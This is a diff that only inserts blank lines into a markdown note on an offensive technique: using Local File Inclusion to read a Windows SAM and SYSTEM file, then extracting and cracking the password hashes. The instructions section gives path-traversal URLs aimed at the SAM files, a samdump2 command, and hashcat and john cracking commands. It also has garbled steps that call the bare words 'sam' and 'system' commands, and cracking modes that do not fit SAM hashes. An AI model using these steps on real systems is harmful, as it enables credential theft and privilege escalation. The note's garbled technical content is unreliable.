@@ -38,6 +38,8 @@ The technical explanation is that the attacker sends a specially crafted HTTP re
 
 The business value of this attack is that it allows an attacker to gain access to sensitive information and escalate privileges, potentially leading to a full compromise of the system or network.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable application that allows Local File Inclusion
@@ -45,6 +47,8 @@ The business value of this attack is that it allows an attacker to gain access t
 1. Access to the Windows system's SAM and SYSTEM files
 
 1. Tools such as samdump2, hashcat, or john to extract and crack password hashes
+
+ 
 
 ## Defense
 
@@ -54,6 +58,8 @@ The business value of this attack is that it allows an attacker to gain access t
 
 1. Implement strong password policies to prevent password cracking attacks
 
+ 
+
 ## Objectives
 
 1. Extract password hashes from the SAM and SYSTEM files on a Windows system
@@ -62,32 +68,60 @@ The business value of this attack is that it allows an attacker to gain access t
 
 1. Escalate privileges and gain access to other systems on the network
 
+ 
+
 # Instructions
 
 1. sam
 
+ 
+
+
+
 **Code**: [[sam]]
+
+
 
 > This command extracts the SAM file from the Windows system.
 
 2. system
 
+ 
+
+
+
 **Code**: [[system]]
+
+
 
 > This command extracts the SYSTEM file from the Windows system.
 
 3. http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
 http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 
+ 
+
+
+
 **Code**: [[http://example.com/index.php?page=../../../../../.]]
+
+
 
 > This HTTP request includes the SAM and SYSTEM files from the Windows system.
 
 4. samdump2 SYSTEM SAM &gt; hashes.txt
 
+ 
+
+
+
 **Code**: [[samdump2 SYSTEM SAM &gt; hashes.txt]]
 
+
+
 > This command extracts password hashes from the SAM and SYSTEM files and saves them to a file named hashes.txt.
+
+
 
 **Command** ([[Extract hashes from SAM and SYSTEM files using samdump2]]):
 
@@ -95,11 +129,21 @@ http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
 samdump2 SYSTEM SAM &gt; hashes.txt
 ```
 
+
+
 5. hashcat/john
+
+ 
+
+
 
 **Code**: [[hashcat/john]]
 
+
+
 > These tools can be used to crack the extracted password hashes and gain access to the Windows system.
+
+
 
 **Command** ([[Cracking password using hashcat]]):
 
@@ -107,11 +151,17 @@ samdump2 SYSTEM SAM &gt; hashes.txt
 $ hashcat -m 1400 hash.txt rockyou.txt
 ```
 
+
+
+
+
 **Command** ([[Cracking password using john]]):
 
 ```bash
 $ john --format=sha256 --wordlist=rockyou.txt hash.txt
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -136,3 +186,5 @@ $ john --format=sha256 --wordlist=rockyou.txt hash.txt
 - [[File Inclusion]]
 - [[LFI to RCE via credentials files]]
 - [[Windows version]]
+
+
